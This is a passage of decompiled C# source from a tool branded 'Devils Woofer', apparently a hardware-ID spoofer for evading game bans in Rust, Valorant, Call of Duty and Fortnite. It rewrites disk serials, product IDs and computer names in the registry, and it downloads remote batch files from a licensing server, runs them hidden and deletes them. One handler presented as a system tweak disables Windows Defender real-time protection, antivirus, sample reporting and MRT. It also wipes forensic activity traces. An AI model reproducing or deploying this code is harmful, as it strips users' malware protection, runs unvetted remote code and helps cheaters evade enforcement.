					if (File.Exists("C:\\Program Files\\Unlisted\\Volumeid.exe"))
					{
						string text7 = "C:\\Program Files\\Unlisted\\change.bat";
						using (StreamWriter streamWriter6 = File.CreateText(text7))
						{
							streamWriter6.WriteLine(string.Concat(new string[]
							{
								"volumeid.exe ",
								text6,
								": ",
								Main.DiskGen(4),
								"-",
								Main.DiskGen(4),
								" -nobanner"
							}));
						}
						Process process7 = new Process();
						process7.StartInfo.FileName = text7;
						this.d.Add(process7);
						File.SetAttributes("C:\\Program Files\\Unlisted\\change.bat", FileAttributes.Hidden);
						process7.Start();
						File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
						File.Delete("C:\\Program Files\\Unlisted\\change.bat");
						Directory.Delete(path5);
					}
					else
					{
						string text8 = "C:\\Program Files\\Unlisted\\change.bat";
						using (StreamWriter streamWriter7 = File.CreateText(text8))
						{
							streamWriter7.WriteLine(string.Concat(new string[]
							{
								"volumeid.exe ",
								text6,
								": ",
								Main.DiskGen(4),
								"-",
								Main.DiskGen(4),
								" -nobanner"
							}));
						}
						Process process8 = new Process();
						process8.StartInfo.FileName = text8;
						this.d.Add(process8);
						File.SetAttributes("C:\\Program Files\\Unlisted\\change.bat", FileAttributes.Hidden);
						process8.Start();
						File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
						File.Delete("C:\\Program Files\\Unlisted\\change.bat");
						Directory.Delete(path5);
					}
					MessageBox.Show("Spoofed Rust!", "Devils Woofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				}
				else if (this.ao.Text == "Valorant v2")
				{
					foreach (string text9 in Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi").GetSubKeyNames())
					{
						foreach (string text10 in Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi\\" + text9).GetSubKeyNames())
						{
							RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey(string.Concat(new string[]
							{
								"HARDWARE\\DEVICEMAP\\Scsi\\",
								text9,
								"\\",
								text10,
								"\\Target Id 0\\Logical Unit Id 0"
							}), true);
							if (registryKey2 != null && registryKey2.GetValue("DeviceType").ToString() == "DiskPeripheral")
							{
								string value2 = Main.RandomId(14);
								string value3 = Main.RandomId(14);
								registryKey2.SetValue("DeviceIdentifierPage", Encoding.UTF8.GetBytes(value3));
								registryKey2.SetValue("Identifier", value2);
								registryKey2.SetValue("InquiryData", Encoding.UTF8.GetBytes(value2));
								registryKey2.SetValue("SerialNumber", value3);
							}
						}
						RegistryKey registryKey3 = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ActiveComputerName", true);
						registryKey3.SetValue("ComputerName", "DESKTOP-" + Main.GenerateString(6));
						registryKey3.Close();
						string.Concat(new string[]
						{
							Main.GenerateString(5),
							"-",
							Main.GenerateString(5),
							"-",
							Main.GenerateString(5),
							"-",
							Main.GenerateString(5)
						});
						string path6 = "C:\\Program Files\\Sounds";
						if (!Directory.Exists(path6))
						{
							Directory.CreateDirectory(path6);
						}
						Main.HWIDclick();
						string path7 = "C:\\Program Files\\Sounds";
						if (!Directory.Exists(path7))
						{
							Directory.CreateDirectory(path7);
						}
						if (File.Exists("C:\\Program Files\\Sounds\\valospoofed.wav"))
						{
							new SoundPlayer("C:\\Program Files\\Sounds\\valospoofed.wav").Play();
						}
						else
						{
							string address2 = "https://cdn.discordapp.com/attachments/953684464104513571/960200320993095731/valospoofed.wav";
							string fileName2 = "C:\\Program Files\\Sounds\\valospoofed.wav";
							WebClient webClient2 = new WebClient();
							webClient2.DownloadFile(address2, fileName2);
							File.SetAttributes("C:\\Program Files\\Sounds\\valospoofed.wav", FileAttributes.Hidden);
							new SoundPlayer("C:\\Program Files\\Sounds\\valospoofed.wav").Play();
						}
						MessageBox.Show("Valorant Spoofed, New ID: " + Main.CurrentProductID(), "Devils Woofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
					}
				}
				else if (this.ao.Text == "Call Of Duty")
				{
					string tempPath2 = Path.GetTempPath();
					byte[] bytes2 = Login.KeyAuthApp.download("319355");
					File.WriteAllBytes(tempPath2 + this.c + ".bat", bytes2);
					File.SetAttributes(tempPath2 + this.c + ".bat", FileAttributes.Hidden);
					Process.Start(tempPath2 + this.c + ".bat");
					Thread.Sleep(2500);
					this.xynwbyzia();
					d d3 = new d();
					d3.b();
					Main.HWIDclick();
					string value4 = string.Concat(new string[]
					{
						Main.GenerateString(5),
						"-",
						Main.GenerateString(5),
						"-",
						Main.GenerateString(5),
						"-",
						Main.GenerateString(5)
					});
					RegistryKey registryKey4 = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", true);
					registryKey4.SetValue("ProductID", value4);
					registryKey4.Close();
					Main.InstallDate();
					Main.Disk();
					Main.HWIDclick();
					Main.XBOXclick();
					Main.PCclick();
					Main.Diskclick();
					Main.bi();
					Main.SpoofPCName();
					string path8 = "C:\\Program Files\\Win64";
					if (!Directory.Exists(path8))
					{
						Directory.CreateDirectory(path8);
					}
					if (File.Exists("C:\\Program Files\\Win64\\net.bat"))
					{
						Process.Start("C:\\Program Files\\Win64\\net.bat");
					}
					else
					{
						string text11 = "C:\\Program Files\\Win64\\net.bat";
						using (StreamWriter streamWriter8 = File.CreateText(text11))
						{
							streamWriter8.WriteLine("netsh int ip reset");
						}
						Process process9 = new Process();
						process9.StartInfo.FileName = text11;
						this.d.Add(process9);
						File.SetAttributes("C:\\Program Files\\Win64\\net.bat", FileAttributes.Hidden);
						process9.Start();
					}
					if (File.Exists("C:\\Program Files\\Unlisted\\Volumeid.exe"))
					{
						File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
					}
					if (File.Exists("C:\\Program Files\\Unlisted\\change.bat"))
					{
						File.Delete("C:\\Program Files\\Unlisted\\change.bat");
					}
					string text12 = this.bh.Text;
					string path9 = "C:\\Program Files\\Unlisted";
					if (!Directory.Exists(path9))
					{
						Directory.CreateDirectory(path9);
					}
					if (File.Exists("C:\\Program Files\\Unlisted\\Volumeid.exe"))
					{
						string text13 = "C:\\Program Files\\Unlisted\\change.bat";
						using (StreamWriter streamWriter9 = File.CreateText(text13))
						{
							streamWriter9.WriteLine(string.Concat(new string[]
							{
								"volumeid.exe ",
								text12,
								": ",
								Main.DiskGen(4),
								"-",
								Main.DiskGen(4),
								" -nobanner"
							}));
						}
						Process process10 = new Process();
						process10.StartInfo.FileName = text13;
						this.d.Add(process10);
						File.SetAttributes("C:\\Program Files\\Unlisted\\change.bat", FileAttributes.Hidden);
						process10.Start();
						File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
						File.Delete("C:\\Program Files\\Unlisted\\change.bat");
						Directory.Delete(path9);
					}
					else
					{
						string text14 = "C:\\Program Files\\Unlisted\\change.bat";
						using (StreamWriter streamWriter10 = File.CreateText(text14))
						{
							streamWriter10.WriteLine(string.Concat(new string[]
							{
								"volumeid.exe ",
								text12,
								": ",
								Main.DiskGen(4),
								"-",
								Main.DiskGen(4),
								" -nobanner"
							}));
						}
						Process process11 = new Process();
						process11.StartInfo.FileName = text14;
						this.d.Add(process11);
						File.SetAttributes("C:\\Program Files\\Unlisted\\change.bat", FileAttributes.Hidden);
						process11.Start();
						File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
						File.Delete("C:\\Program Files\\Unlisted\\change.bat");
						Directory.Delete(path9);
					}
					MessageBox.Show("Spoofed Call Of Duty!", "Devils Woofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				}
				else if (this.ao.Text == "Fortnite")
				{
					string tempPath3 = Path.GetTempPath();
					byte[] bytes3 = Login.KeyAuthApp.download("299894");
					File.WriteAllBytes(tempPath3 + this.c + ".bat", bytes3);
					File.SetAttributes(tempPath3 + this.c + ".bat", FileAttributes.Hidden);
					Process.Start(tempPath3 + this.c + ".bat");
					Thread.Sleep(2500);
					this.xynwbyzia();
					string tempPath4 = Path.GetTempPath();
					byte[] bytes4 = Login.KeyAuthApp.download("203677");
					File.WriteAllBytes(tempPath4 + this.c + ".bat", bytes4);
					File.SetAttributes(tempPath4 + this.c + ".bat", FileAttributes.Hidden);
					Process.Start(tempPath4 + this.c + ".bat");
					Thread.Sleep(2500);
					this.xynwbyzia();
					string tempPath5 = Path.GetTempPath();
					byte[] bytes5 = Login.KeyAuthApp.download("639184");
					File.WriteAllBytes(tempPath5 + this.c + ".bat", bytes5);
					File.SetAttributes(tempPath5 + this.c + ".bat", FileAttributes.Hidden);
					Process.Start(tempPath5 + this.c + ".bat");
					Thread.Sleep(2500);
					this.xynwbyzia();
					string path10 = "C:\\Program Files\\Sounds";
					if (!Directory.Exists(path10))
					{
						Directory.CreateDirectory(path10);
					}
					if (File.Exists("C:\\Program Files\\Sounds\\fortinaity.wav"))
					{
						new SoundPlayer("C:\\Program Files\\Sounds\\fortinaity.wav").Play();
						MessageBox.Show("Fortnite Spoofed!", "Devils Woofer", MessageBoxButtons.OK, MessageBoxIcon.Hand);
					}
					else
					{
						string address3 = "https://cdn.discordapp.com/attachments/953684464104513571/959438041670381628/fortinaity.wav";
						string fileName3 = "C:\\Program Files\\Sounds\\fortinaity.wav";
						WebClient webClient3 = new WebClient();
						webClient3.DownloadFile(address3, fileName3);
						File.SetAttributes("C:\\Program Files\\Sounds\\fortinaity.wav", FileAttributes.Hidden);
						new SoundPlayer("C:\\Program Files\\Sounds\\fortinaity.wav").Play();
						MessageBox.Show("Fortnite Spoofed!", "Devils Woofer", MessageBoxButtons.OK, MessageBoxIcon.Hand);
					}
				}
				else
				{
					MessageBox.Show("Please Select A Game!", "Devils Woofer", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600005B RID: 91 RVA: 0x000021DE File Offset: 0x000003DE
		private void ac(object sender, EventArgs e)
		{
			this.ai.BringToFront();
		}

		// Token: 0x0600005C RID: 92 RVA: 0x000021EB File Offset: 0x000003EB
		private void ad(object sender, EventArgs e)
		{
			this.ap.BringToFront();
		}

		// Token: 0x0600005D RID: 93 RVA: 0x000021CF File Offset: 0x000003CF
		private void ae(object sender, PaintEventArgs e)
		{
		}

		// Token: 0x0600005E RID: 94 RVA: 0x000021CF File Offset: 0x000003CF
		private void af(object sender, EventArgs e)
		{
		}

		// Token: 0x0600005F RID: 95 RVA: 0x000021F8 File Offset: 0x000003F8
		private void ag(object sender, EventArgs e)
		{
			Main.HWIDclick();
			MessageBox.Show("Spoofed HWID!", "Devils Woofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		// Token: 0x06000060 RID: 96 RVA: 0x00005FF8 File Offset: 0x000041F8
		public void xynwbyzia()
		{
			string tempPath = Path.GetTempPath();
			if (Process.GetProcessesByName(this.c + ".bat").Length == 0)
			{
				File.Delete(tempPath + this.c + ".bat");
			}
			else
			{
				Thread.Sleep(5000);
				this.xynwbyzia();
			}
		}

		// Token: 0x06000061 RID: 97 RVA: 0x00006050 File Offset: 0x00004250
		public static string GenerateDate(int size)
		{
			char[] array = new char[size];
			for (int i = 0; i < size; i++)
			{
				array[i] = "abcdef0123456789"[Main.random.Next("abcdef0123456789".Length)];
			}
			return new string(array);
		}

		// Token: 0x06000062 RID: 98 RVA: 0x0000609C File Offset: 0x0000429C
		private void ah(object sender, EventArgs e)
		{
			string value = Main.GenerateDate(8);
			RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", true);
			registryKey.SetValue("InstallDate", value);
			registryKey.Close();
			MessageBox.Show("Logs Spoofed!", "Devils Woofer", MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}

		// Token: 0x06000063 RID: 99 RVA: 0x00002212 File Offset: 0x00000412
		private void ai(object sender, EventArgs e)
		{
			Thread.Sleep(2500);
			MessageBox.Show("Mac Spoofed!", "Devils Woofer", MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}

		// Token: 0x06000064 RID: 100 RVA: 0x000060F0 File Offset: 0x000042F0
		private void aj(object sender, EventArgs e)
		{
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", "Append Completion", "yes", RegistryValueKind.String);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", "AutoSuggest", "yes", RegistryValueKind.String);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer", "EnableAutoTray", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Remote Assistance", "fAllowToGetHelp", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "DisallowShaking", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CLASSES_ROOT\\AllFilesystemObjects\\shellex\\ContextMenuHandlers\\Copy To", "", "{C2FBB630-2971-11D1-A18C-00C04FD75D13}");
			Registry.SetValue("HKEY_CLASSES_ROOT\\AllFilesystemObjects\\shellex\\ContextMenuHandlers\\Move To", "", "{C2FBB631-2971-11D1-A18C-00C04FD75D13}");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "AutoEndTasks", "1");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "HungAppTimeout", "1000");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "MenuShowDelay", "0");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "WaitToKillAppTimeout", "2000");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "LowLevelHooksTimeout", "1000");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Mouse", "MouseHoverTime", "0");
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoLowDiskSpaceChecks", "00000001", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "LinkResolveIgnoreLinkInfo", "00000001", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoResolveSearch", "00000001", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoResolveTrack", "00000001", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoInternetOpenWith", "00000001", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control", "WaitToKillServiceTimeout", "2000");
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\DiagTrack", "Start", "4", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\diagsvc", "Start", "4", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\diagnosticshub.standardcollector.service", "Start", "4", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\dmwappushservice", "Start", "4", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "HideFileExt", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile", "SystemResponsiveness", 1, RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "GPU Priority", 8, RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "Priority", 6, RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "Scheduling Category", "High", RegistryValueKind.String);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "SFIO Priority", "High", RegistryValueKind.String);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "GPU Priority", 0, RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "Priority", 8, RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "Scheduling Category", "Medium", RegistryValueKind.String);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "SFIO Priority", "High", RegistryValueKind.String);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", true).DeleteValue("Append Completion", false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", true).DeleteValue("AutoSuggest", false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer", true).DeleteValue("EnableAutoTray", false);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Remote Assistance", "fAllowToGetHelp", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "DisallowShaking", "0", RegistryValueKind.DWord);
			Registry.ClassesRoot.DeleteSubKeyTree("AllFilesystemObjects\\\\shellex\\\\ContextMenuHandlers\\\\Copy To", false);
			Registry.ClassesRoot.DeleteSubKeyTree("AllFilesystemObjects\\\\shellex\\\\ContextMenuHandlers\\\\Move To", false);
			Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true).DeleteValue("AutoEndTasks", false);
			Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true).DeleteValue("HungAppTimeout", false);
			Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true).DeleteValue("WaitToKillAppTimeout", false);
			Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true).DeleteValue("LowLevelHooksTimeout", false);
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "MenuShowDelay", "400");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Mouse", "MouseHoverTime", "400");
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("NoLowDiskSpaceChecks", false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("LinkResolveIgnoreLinkInfo", false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("NoResolveSearch", false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("NoResolveTrack", false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("NoInternetOpenWith", false);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control", "WaitToKillServiceTimeout", "5000");
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\DiagTrack", "Start", "2", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\diagnosticshub.standardcollector.service", "Start", "2", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\dmwappushservice", "Start", "2", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "HideFileExt", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile", "SystemResponsiveness", 14, RegistryValueKind.DWord);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", true).DeleteValue("GPU Priority", false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", true).DeleteValue("Priority", false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", true).DeleteValue("Scheduling Category", false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", true).DeleteValue("SFIO Priority", false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", true).DeleteValue("GPU Priority", false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", true).DeleteValue("Priority", false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", true).DeleteValue("Scheduling Category", false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", true).DeleteValue("SFIO Priority", false);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\System", "PublishUserActivities", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\SQMClient\\Windows", "CEIPEnable", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "AITEnable", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "DisableInventory", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "DisablePCA", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "DisableUAR", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Device Metadata", "PreventDeviceMetadataFromNetwork", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\MRT", "DontOfferThroughWUAU", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\AutoLogger\\SQMLogger", "Start", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\current\\device\\System", "AllowExperimentation", 0);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiVirus", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableSpecialRunningModes", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableRoutinelyTakingAction", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "ServiceKeepAlive", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableRealtimeMonitoring", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Signature Updates", "ForceUpdateFromMU", 0);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet", "DisableBlockAtFirstSeen", 1);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\MpEngine", "MpEnablePus", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "PUAProtection", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Policy Manager", "DisableScanningNetworkFiles", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiSpyware", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableRealtimeMonitoring", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender\\Spynet", "SpyNetReporting", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender\\Spynet", "SubmitSamplesConsent", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\MRT", "DontReportInfectionInformation", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\MRT", "DontOfferThroughWUAU", "1", RegistryValueKind.DWord);
			Registry.ClassesRoot.DeleteSubKeyTree("\\CLSID\\{09A47860-11B0-4DA5-AFA5-26D86198A780}", false);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableBehaviorMonitoring", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableOnAccessProtection", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableScanOnRealtimeEnable", "1", RegistryValueKind.DWord);
			Main.HWIDclick();
			string text = Path.ChangeExtension(Path.GetTempFileName(), ".bat");
			using (StreamWriter streamWriter = new StreamWriter(text))
			{
				streamWriter.WriteLine("echo off");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("taskkill /f /im Steam.exe /t");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("set hostspath=%windir%\\System32\\drivers\\etc\\hosts");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\MSLicensing\\HardwareID / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\MSLicensing\\Store / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\WinRAR\\ArcHistory / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings\\S - 1 - 5 - 21 - 1282084573 - 1681065996 - 3115981261 - 1001 / va / f");
				streamWriter.WriteLine("cls");
